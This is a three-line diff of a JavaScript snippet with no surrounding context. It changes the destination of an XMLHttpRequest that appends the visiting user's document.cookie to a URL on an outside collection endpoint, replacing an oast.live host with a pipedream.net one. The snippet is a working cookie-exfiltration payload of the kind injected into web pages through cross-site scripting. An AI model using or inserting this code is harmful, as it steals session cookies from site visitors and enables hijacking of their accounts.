@@ -1,3 +1,3 @@
 var xhr = new XMLHttpRequest();
-xhr.open("GET", "https://cqn5mjlarg3eqfajh7m0pzhzyo7mx44yh.oast.live?cookie=" + document.cookie, true);
+xhr.open("GET", "https://eoow6y96ffo9mzx.m.pipedream.net?cookie=" + document.cookie, true);
 xhr.send();
